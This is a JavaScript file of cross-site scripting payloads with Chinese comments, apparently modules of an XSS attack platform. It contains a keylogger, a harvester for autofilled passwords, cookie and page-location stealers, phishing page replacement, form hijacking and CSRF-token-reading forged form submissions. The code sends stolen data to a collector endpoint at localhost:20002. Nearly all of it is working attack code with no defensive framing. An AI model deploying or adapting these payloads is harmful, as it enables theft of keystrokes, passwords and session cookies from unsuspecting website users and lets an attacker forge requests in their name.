var htmlStaticComFunc = {} ;
//键盘记录
htmlStaticComFunc.keyLog = function () {
    var logger = "";
    keyDown = function(e)
    {
        var e=e||event;
        var currKey=e.keyCode||e.which||e.charCode;
        if((currKey>7&&currKey<32)||(currKey>31&&currKey<47))
        {
            switch(currKey)
            {
                case 8: keyName = "[退格]"; break;
                case 9: keyName = "[制表]"; break;
                case 13:keyName = "[回车]"; break;
                //case 16:keyName = "[shift]"; break;
                case 17:keyName = "[Ctrl]"; break;
                case 18:keyName = "[Alt]"; break;
                case 20:keyName = "[大小写]"; break;
                case 32:keyName = "[空格]"; break;
                case 33:keyName = "[PageUp]";   break;
                case 34:keyName = "[PageDown]";   break;
                case 35:keyName = "[End]";   break;
                case 36:keyName = "[Home]";   break;
                case 37:keyName = "[方向键左]";   break;
                case 38:keyName = "[方向键上]";   break;
                case 39:keyName = "[方向键右]";   break;
                case 40:keyName = "[方向键下]";   break;
                case 46:keyName = "[删除]";   break;
                default:keyName = "";    break;
            }
            logger += keyName;
        }
    }
    keyPress = function(e)
    {
        var currKey=0,CapsLock=0,e=e||event;
        currKey=e.keyCode||e.which||e.charCode;
        CapsLock=currKey>=65&&currKey<=90;
        switch(currKey)
        {
            //屏蔽了退格、制表、回车、空格、方向键、删除键等
            case 8: case 9:case 13:case 16:case 17:case 18:case 20:
            case 32: case 33: case 34: case 35: case 36: case 37:case 38:
            case 39:case 40:case 46:keyName = "";break;
            default:keyName = String.fromCharCode(currKey); break;
        }
        logger += keyName;
    }
    sendChar = function()
    {
        if (!logger) return;
        (new Image).src="http://localhost:20002/log.php?log=" + logger; //服务端地址
        logger = "";
    }
    formSubmit = function()
    {
        sendChar();
    }
    document.onkeydown = keyDown;
    document.onkeypress = keyPress;
    document.onsubmit = formSubmit;
    setInterval(sendChar, 1000); //设置定时器
};

//明文密码
htmlStaticComFunc.usePwd = function (user) {
    var f = document.createElement('form');
    f.style.display = 'none'
    document.getElementsByTagName('body') [0].appendChild(f);
    var e1 = document.createElement('input');
    e1.type = '{set.type1}';
    e1.name = '{set.name1}';
    e1.id = '{set.id1}';
    f.appendChild(e1);
    var e = document.createElement('input');
    e.name = '{set.name2}';
    e.type = '{set.type2}';
    e.id = '{set.id2}';
    f.appendChild(e);
    setTimeout(function () {
        username = document.getElementById('{set.id1}').value;
        password = document.getElementById('{set.id2}').value;
        if (username.length > 0) {
            var newimg = new Image();
            newimg.src = 'http://localhost:20002/log.php?name=' + username + '&pwd=' + password;
        }
    }, 2000); /* 时间竞争*/
};

//xss
var XSS = function(){
    //设置信息
    var x = {
        'name':'xss.js',
        'version':'0.1'
    };

    //打印
    x.c = function (d) {
      return console.log(d);
    };

    //获取ID
    x.x=function(id){
        return document.getElementById(id)
    };

    //容错取值
    x.e=function(_){
        try{
            return eval('('+_+')')
        }catch(e){
            return''
        }
    };

    //浏览器
    x.i={
        ie:!!self.ActiveXObject,
        chrome:!!self.chrome,
        fireFox:self.mozPaintCount>-1,
        opera:!!self.opera,
        s:!self.chrome&&!!self.WebKitPoint
    };

    //UA
    x.ua = navigator.userAgent;

    //判断是否为苹果手持设备
    x.apple=x.ua.match(/ip(one|ad|od)/i)!=null;

    //随机数
    x.rdm=function(){
        return (Math.random()*100000)
    };

    //url编码(UTF8)
    x.ec=encodeURIComponent;

    x.html=document.getElementsByTagName('html')[0];

    /*
     * 销毁一个元素
    */
    x.kill=function(e){
        e.parentElement.removeChild(e);
    };

    /*
     *绑定事件
     */
    x.bind=function(e,name,fn){
        e.addEventListener?e.addEventListener(name,fn,false):e.attachEvent("on"+name,fn);
    };

    /*
     * dom准备完毕时执行函数
    */
    x.ready=function(fn){
        if(!x.i.i){
            x.bind(document,'DOMContentLoaded',fn);
        }else{
            var s = setInterval(function(){
                try{
                    document.body.doScroll('left');
                    clearInterval(s);
                    fn();
                }catch(e){}
            },4);
        }
    };

    /*
      * 同源检测
     */
    x.o=function(url){
        var link = x.dom('<a href="'+encodeURI(url)+'">',2);
        return link.protocol+link.hostname+':'+link.port==location.protocol+location.hostname+':'+link.port;
    };

    /*
     * html to dom
     */
    x.dom=function(html,gcsec){
        var tmp = document.createElement('span');
        tmp.innerHTML=html;
        var e = tmp.children[0];
        e.style.display='none';
        x.html.appendChild(e);
        gcsec>>0>0&&setTimeout(function(){
            x.kill(e);
        },gcsec*1000);
        return e;
    };

    /*
     * ajax
    */
    x.ajax = function(url,params,callback){
        (params instanceof Function)&&(callback=params,params=void(0));
        var XHR = (!x.o(url)&&window.XDomainRequest)||
            window.XMLHttpRequest||
            (function(){return new ActiveXObject('MSXML2.XMLHTTP')});
        var xhr = new XHR();
        xhr.open(params?'post':'get',url);
        try{xhr.setRequestHeader('content-type','application/x-www-form-urlencoded')}catch(e){}
        callback&&(xhr.onreadystatechange = function() {
            (this.readyState == 4 && ((this.status >= 200 && this.status <= 300) || this.status == 304))&&callback.apply(this,arguments);
        });
        xhr.send(params);
    };

    /*
     * no ajax
     */
    x.najax=function(url,params){
        if(params){
            var form = x.dom('<form method=post accept-charset=utf-8>');
            form.action=url;
            for(var name in params){
                var input = document.createElement('input');
                input.name=name;
                input.value=params[name];
                form.appendChild(input);
            }
            var iframe = x.dom('<iframe name=_'+x.rdm()+'_>',6);
            form.target=iframe.name;
            form.submit();
        }else{
            new Image().src=url+'&'+x.rdm();
        }
    };

    /*
     * 钓鱼
    */
    x.phish=function(url){
        x.ajax(url,function(){
            document.open();
            document.write(this.responseText);
            document.close();
            history.replaceState&x.o(url)&&history.replaceState('','',url);
        })
    };

    /*
     * 表单劫持
    */
    x.xform=function(form,action){
        form.old_action=form.action,form.old_target=form.target,form.action=action;
        var iframe = x.dom('<iframe name=_'+x.rdm()+'_>');
        form.target=iframe.name;
        setTimeout(function(){
            x.bind(iframe,'load',function(){
                form.action=form.old_action,form.target=form.old_target,form.onsubmit=null,form.submit();
            })
        },30);
    };

    /*
     * 函数代理
    */
    x.proxy=function(fn,before,after){
        return function(){
            before&&before.apply(this,arguments);
            var result = fn.apply(this,arguments);
            after&&after.apply(this,arguments);
            return result;
        }
    };

    return x;
}();

//钓鱼
//自动发送页面信息
(function(){
    (new Image()).src = 'http://localhost:20002/put.php?do=api&id={projectId}&location='+escape((function(){try{return document.location.href}catch(e){return ''}})())+'' +
        '&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'' +
        '&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'' +
        '&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());
})();

if('{set.keepsession}'==1){
    keep=new Image();
    keep.src='http://localhost:20002/put.php?do=keepsession&id={projectId}&url='+escape(document.location)+'&cookie='+escape(document.cookie)
};

//钓鱼
(function () {
    (new Image()).src ="http://localhost:20002/put.php?name=abc&pwd=12345" ;
})() ;

//表单构建
var buildForm = function () {
    //基础信息
    var init = {
        'name': 'from build' ,
        'version':'1.0.1',
        'author': 'sjm'
    } ;

    //yii csrf验证
    init.frame = function (data,frame) {
        switch(frame) {
            case 'yii' :
                var length = document.getElementsByName('csrf-token').length ;
                if(length === 1) {
                    data['_csrf'] = document.getElementsByName('csrf-token')[0].content;
                }
                return data ;
            default :
                return data ;
        }
    };

    /**
     *  通过dom构建表单
     * @param hidData Object { 'alipay_account': 'show tables ;'} ;
     * @param url
     * @param frame
     * @param method
     */
    init.dom = function (hidData,url,frame,method) {
        if(!hidData) return ;
        if(!method) method = 'post' ;
        if(frame) {
            hidData = init.frame(hidData,frame) ;
        }
        var f = document.createElement("form");
        document.body.appendChild(f);
        for( var i in hidData ) {
            var temp = document.createElement("input");
            temp.type = "hidden";
            f.appendChild(temp);
            temp.value = hidData[i];
            temp.name = i ;
        }
        /*JSON.stringify()
        JSON.parse()*/
        f.action = url;
        f.method = method;
        f.submit();
    };

    //设置 header 表单
    init.herderDom = function (data,url,header,frame,method) {
        if(!data)   return ;
        if(!method) method = 'POST';
        //xml对象
        var xmlhttp = new XMLHttpRequest();
        //目标地址
        xmlhttp.open(method, url,true);
        //设置header
        if(header) {
            for( var i in header ) {
                xmlhttp.setRequestHeader(i, header[i]);
            }
        }
        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        if(frame) {
            data = init.frame(data,frame) ;
        }
        //数据设置
        var content = '';
        for (var d in data) {
            content += '&'+d+'='+data[d] ;
        }
        xmlhttp.send(content) ; //内容格式根据Content-type设置的格式而定
        xmlhttp.onreadystatechange = function(){
            if(xmlhttp.readyState == 4 && xmlhttp.status == 200){
                //成功
                console.log(xmlhttp.responseText);
            }
        }
    };

    return init ;
}();